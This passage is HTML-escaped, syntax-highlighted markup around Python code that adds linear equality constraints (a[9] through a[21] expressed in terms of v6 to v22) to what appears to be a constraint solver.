class=&#34;n&#34;&gt;v7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v9&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v9&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;44&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;56&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;77&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;46&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;78&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;99&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;67&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;87&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;75&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;66&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;54&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;85&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;56&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;35&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;99&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;57&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v18&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;71&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;69&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v21&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;75&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;67&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v18&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;35&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v21&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;99&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;77&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;54&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v18&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;47&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;47&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;71&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v21&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;83&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;27&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;34&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v18&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;39&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;99&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v21&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;93&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;19&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v18&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;95&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;69&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v21&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;57&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;61&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v18&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;93&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;79&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v21&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;87&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;55&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;26&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;57&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v18&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v21&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;79&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
